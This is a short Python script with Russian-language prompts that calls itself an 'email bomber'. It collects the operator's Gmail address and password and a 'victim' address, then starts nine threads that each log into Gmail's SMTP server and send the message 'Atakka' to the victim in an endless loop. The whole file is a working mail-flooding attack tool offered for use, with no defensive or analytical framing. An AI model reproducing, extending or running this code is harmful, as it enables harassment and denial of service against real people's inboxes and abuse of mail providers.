import smtplib
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

print("Это email бомбер, ВАЖНО: В настройках безопасности своего gmail аккаунта включите Небезопасные приложения.Version beta 0.1")

fromaddr = input("Ваш gmail: ")
mypass =  input("Ваш пароль: ")
toaddr = input("Email жертвы:")

def thread(my_func):
    def wrapper(*args, **kwargs):
        my_thread = threading.Thread(target=my_func, args=args, kwargs=kwargs)
        my_thread.start()
    return wrapper
@thread
def go():
	while True:
		msg = MIMEMultipart()
		msg['From'] = fromaddr
		msg['To'] = toaddr
		msg['Subject'] = "Atakka"
		body = "Atakka"
		msg.attach(MIMEText(body, 'plain'))
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.starttls()
		server.login(fromaddr, mypass)
		text = msg.as_string()
		server.sendmail(fromaddr, toaddr, text)
		print("Сообщение отправлено ")
		server.quit()
go()
go()
go()
go()
go()
go()
go()
go()
go()
